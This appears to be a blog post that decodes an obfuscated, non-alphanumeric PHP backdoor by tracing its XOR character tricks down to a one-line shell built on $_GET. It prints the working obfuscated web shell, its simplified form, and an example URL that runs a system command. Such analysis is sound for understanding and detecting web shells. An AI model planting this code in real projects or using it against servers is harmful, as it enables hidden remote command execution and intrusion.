---
layout: post
title:  "Dissecting Non-Alphanumeric PHP Backdoor"
date:   2021-09-24 09:17:08 +0100
tags: php backdoor
---
# Non-Alphanumeric PHP Backdoor

<br>I found this non-alphanumeric PHP backdoor on the interwebs and thought it was interesting so here I'll try explaining how it works
{% highlight php linenos %}
<?php
$_="{"; 
$_=($_^"<").($_^">;").($_^"/");
?>
<?=${'_'.$_}["_"](${'_'.$_}["__"]);?>
{% endhighlight %}

<br>After renaming the variable and beautifying the code, I ended up with this
{% highlight php linenos %}
<?php
$a = ("{" ^ "<") . ("{" ^ ">") . ("{" ^ "/");
echo ${"_$a"}["_"]( ${"_$a"}["__"] );
?>
{% endhighlight %}

<br>We can see that it's using the bitwise xor operator on some characters and whenever you xor two characters the following happens

| Value #1     | Operation         | Value #2 |
|:-------------|:-----------------:|:---------|
| {            | ^                 | <        |
| {            | ^                 | >        |
| {            | ^                 | /        |

First, the characters get converted to their ASCII equivalent 

| Value #1     | Operation         | Value #2 |
|:-------------|:-----------------:|:---------|
| 123          | ^                 | 60       |
| 123          | ^                 | 62       |
| 123          | ^                 | 47       |

Then the ASCIIs get converted to binary 

| Value #1     | Operation         | Value #2 |
|:-------------|:-----------------:|:---------|
| 1111011      | ^                 | 111100   |
| 1111011      | ^                 | 111110   |
| 1111011      | ^                 | 101111   |

and finally they get xor-ed

| Operation        | Binary  | ASCII | Plaintext |
|------------------|---------|-------|-----------|
| 1111011 ^ 111100 | 1000111 | 71    | G         |
| 1111011 ^ 111110 | 1000101 | 69    | E         |
| 1111011 ^ 101111 | 1010100 | 84    | T         |

Add this to the orignial code and we get
{% highlight php linenos %}
<?php
$a = "G" . "E" . "T";
echo ${"_$a"}["_"]( ${"_$a"}["__"] );
?>
{% endhighlight %}
<br>Or simplified
{% highlight php linenos %}
<?php
echo $_GET["_"]($_GET["__"]);
?>
{% endhighlight %}
<br>The backdoor can later on be accessed like this
{% highlight linenos %}
http://192.168.1.1/backdoor.php?_=system&__=ls -la
{% endhighlight %}
